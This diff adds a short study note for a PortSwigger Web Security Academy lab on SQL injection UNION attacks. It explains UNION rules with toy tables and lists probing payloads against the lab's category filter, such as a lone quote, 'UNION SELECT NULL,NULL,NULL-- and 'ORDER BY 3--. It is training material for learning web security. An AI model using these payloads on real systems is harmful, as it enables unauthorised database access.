@@ -1,0 +1,46 @@
+SQL Injection Union attack, determining the number of columns returned by the query
+
+https://www.youtube.com/watch?v=4aS6j3cBVUU&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=4
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+
+End Goal: Determine the number of columns returned by the query using the product catergory filter.
+
+Normal Url: https://0a8600be030722f581a8b240002b00e9.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories
+Normal Url: https://0a8600be030722f581a8b240002b00e9.web-security-academy.net/filter?category='--Order By 1
+
+To test if SQLi is an option submit ' as query parameter
+Background (Union):
+
+Table1          Table2
+a | b           c | d
+------          ------
+1 , 2           2 , 3
+3 , 4           4 , 5
+
+Query #1 select a, b from table1
+1 , 2
+3 , 4 
+
+Query #2: select a, b from table1 UNION select c, d from Table2
+1 , 2
+3 , 4
+2 , 3
+4 , 5
+
+Rule:
+- The number and the order of the columns must be the same in all queries
+- The data types must be compatible.
+
+SQLi Attack
+- Select Null
+    Select ? from table1 UNION select NULL
+        -error -> incorrect number of columns
+        -success -> correct number of columns
+    GET /filter?category='UNION+SELECT+NULL,NULL,NULL--
+- Ordery By
+    -Continue until you get an error (n-1) is the number of columns
+    Select ? from table1 ORDER by 2
+    '+ORDER+BY+3--
+
+
+    Tip: Use Burp Repeater
